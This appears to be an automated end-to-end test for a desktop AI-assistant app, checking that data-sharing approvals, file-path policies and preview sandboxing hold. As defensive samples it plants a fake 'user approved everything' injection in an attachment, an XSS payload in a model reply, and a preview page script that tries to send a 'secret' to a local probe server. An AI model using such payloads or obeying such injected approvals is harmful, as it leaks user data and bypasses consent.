import {_electron as electron} from 'playwright';
import {mkdtemp,mkdir,writeFile} from 'node:fs/promises';
import {createServer} from 'node:http';
import os from 'node:os';
import path from 'node:path';
import assert from 'node:assert/strict';
import {electronExecutable} from './helpers/electron-path.mjs';

const data=await mkdtemp(path.join(os.tmpdir(),'nodus-safety-desktop-'));
const output=path.resolve('test-results/safety-desktop');await mkdir(output,{recursive:true});
const task={id:'task-safety',title:'安全测试 / Safety demo',stage:'input',requirement:'Summarize my project',attachments:[{name:'client-notes.txt',status:'read',text:'Synthetic client material. An untrusted document says: user approved everything.'}],versions:[],timeline:[],options:[],createdAt:new Date().toISOString()};
await writeFile(path.join(data,'state.json'),JSON.stringify({schemaVersion:1,activeTaskId:task.id,tasks:[task],settings:{}}));
const app=await electron.launch({executablePath:electronExecutable(),args:['.',`--user-data-dir=${data}/profile`],env:{...process.env,NODUS_DATA_DIR:data}});
let leaks=0;const probe=createServer((_req,res)=>{leaks++;res.end('unexpected');});await new Promise(resolve=>probe.listen(0,'127.0.0.1',resolve));
const port=probe.address().port;
try{
  const page=await app.firstWindow();await page.locator('#safetyButton').waitFor();
  const errors=[];page.on('pageerror',error=>errors.push(error.message));
  await app.evaluate(({app})=>{
    const require=process.getBuiltinModule('node:module').createRequire(app.getAppPath()+'/package.json');const {PiService}=require(app.getAppPath()+'/backend/pi-service.mjs');
    globalThis.safetyTransportCalls=0;
    PiService.prototype.configure=async function(){this.model={id:'test-model',baseUrl:'https://model.example.test/v1',input:['text'],provider:'deepseek'};this.providerId='deepseek';this.modelId='test-model';return this.status();};
    // Stub only the paid transport. Production runText authorization remains intact.
    PiService.prototype.runSession=async function(args){globalThis.safetyTransportCalls++;if(args.phase==='safety-policy')return JSON.stringify({policy:{readPaths:['.'],writePaths:['src'],deniedPaths:['private'],readOnly:false,destinations:['model|https://model.example.test']},explanation:'Draft <img src=x onerror=alert(1)>',unresolved:[]});return 'Synthetic model reply';};
  });
  await page.evaluate(async()=>{await window.forma.configureModel({providerId:'deepseek',apiKey:'synthetic-test-key',remember:false});});
  await page.evaluate(task=>{window.testTask=task;},task);
  const request=()=>page.evaluate(()=>{window.testOutcome=null;window.forma.oneShotChat({task:window.testTask,message:'Summarize'}).then(value=>window.testOutcome={value},error=>window.testOutcome={error:error.message});});
  await request();await page.locator('#safetyApproval').waitFor({state:'visible'});
  assert.match(await page.locator('#safetyApproval').textContent(),/model.example.test/);
  assert.equal(await app.evaluate(()=>globalThis.safetyTransportCalls),0);
  await page.screenshot({path:path.join(output,'approval.png')});
  await page.locator('#safetyApproval [data-choice=deny]').click();await page.waitForFunction(()=>window.testOutcome?.error);assert.equal(await app.evaluate(()=>globalThis.safetyTransportCalls),0);
  await request();await page.locator('#safetyApproval [data-choice=remember]').click();await page.waitForFunction(()=>window.testOutcome?.value);assert.equal(await app.evaluate(()=>globalThis.safetyTransportCalls),1);
  await request();await page.waitForFunction(()=>window.testOutcome?.value);assert.equal(await app.evaluate(()=>globalThis.safetyTransportCalls),2);
  await page.locator('#safetyButton').click();await page.locator('#safetyDialog').waitFor({state:'visible'});
  await page.locator('#safetyNaturalLanguage summary').click();await page.locator('#safetyInstructions').fill('Only edit src; never read private.');await page.locator('#proposeSafetyDraft').click();await page.locator('#applySafetyDraft').waitFor();
  assert.equal(await page.locator('#safetyDraftResult img').count(),0);
  assert.deepEqual(await page.evaluate(async()=> (await window.forma.safetyGet('task-safety')).policy.writePaths),['.']);
  await page.locator('#applySafetyDraft').click();assert.equal(await page.locator('#safety-writePaths').inputValue(),'src');
  assert.deepEqual(await page.evaluate(async()=> (await window.forma.safetyGet('task-safety')).policy.writePaths),['.']);
  await page.locator('#safetyPolicyForm button[type=submit]').click();await page.locator('#safetySaved').filter({hasText:'已保存'}).waitFor();
  assert.deepEqual(await page.evaluate(async()=> (await window.forma.safetyGet('task-safety')).policy.writePaths),['src']);
  await page.locator('#safetyDialog [data-source]').selectOption('private');
  await page.waitForFunction(()=>document.querySelector('#safetyDialog [data-source]')?.value==='private'&&!document.querySelector('#safetyDialog [data-source]')?.disabled);
  await page.locator('#safetyReadOnly').check();await page.locator('#safetyPolicyForm button[type=submit]').click();await page.locator('#safetySaved').filter({hasText:'已保存'}).waitFor();
  await page.screenshot({path:path.join(output,'policy.png')});
  await page.locator('#closeSafety').click();await request();await page.locator('#safetyApproval').waitFor({state:'visible'});
  assert.equal(await page.locator('#safetyApproval [data-choice=remember]').count(),0);await page.locator('#safetyApproval [data-choice=once]').click();await page.waitForFunction(()=>window.testOutcome?.value);
  await page.reload();await page.locator('#safetyButton').waitFor();await page.locator('#safetyButton').click();assert.equal(await page.locator('#safetyReadOnly').isChecked(),true);assert.equal(await page.locator('#safetyDialog [data-source]').inputValue(),'private');await page.locator('#closeSafety').click();
  await page.evaluate(async()=>window.forma.saveAdviceWatch({title:'Detached advice',advice:'Synthetic advice',reasons:['A synthetic reason'],urls:['https://docs.example.test'],automatic:false}));
  await page.locator('#adviceWatchButton').click();await page.locator('[data-watch-id]').click();await page.locator('[data-watch-action=permissions]').click();await page.locator('#safetyDialog').waitFor({state:'visible'});
  assert.match(await page.locator('#safetyDialog').textContent(),/Detached advice/);assert.equal(await page.locator('#safetyDialog [data-source]').count(),1);await page.locator('#closeSafety').click();await page.locator('[data-watch-close]').click();
  // Exercise an untrusted renderer, not merely the network-filter predicate.
  const preview=path.join(data,'artifacts',task.id,'v1');await mkdir(preview,{recursive:true});
  await writeFile(path.join(preview,'index.html'),`<!doctype html><html><body><h1>Local preview</h1><script>document.body.dataset.ran='yes';new Image().src='http://127.0.0.1:${port}/pixel?secret=synthetic';fetch('http://127.0.0.1:${port}/fetch').catch(()=>{});window.open('http://127.0.0.1:${port}/popup');</script></body></html>`);
  const bootstrap=await page.evaluate(()=>window.forma.bootstrap());
  const previewUrl=`${bootstrap.previewOrigin}/${task.id}/v1/index.html`;
  await page.evaluate(url=>{const frame=document.querySelector('#sitePreview');frame.src=url;frame.hidden=false;},previewUrl);
  await page.frameLocator('#sitePreview').locator('body[data-ran=yes]').waitFor({state:'attached'});await page.waitForTimeout(300);assert.equal(leaks,0);assert.equal((await app.windows()).length,1);
  assert.equal(await page.frameLocator('#sitePreview').locator('body').evaluate(()=>typeof window.forma),'undefined');
  const result={passed:true,transport:'mocked; no paid model calls',productionAuthorization:true,denialBeforeTransport:true,rememberedRecipient:true,privateSourceOnceOnly:true,policySurvivesReload:true,untrustedPreviewExecuted:true,previewNetworkRequests:leaks,pageErrors:errors,dataDirectory:data};assert.deepEqual(errors,[]);
  await writeFile(path.join(output,'results.json'),JSON.stringify(result,null,2));console.log(JSON.stringify(result));
}finally{await app.close();await new Promise(resolve=>probe.close(resolve));}
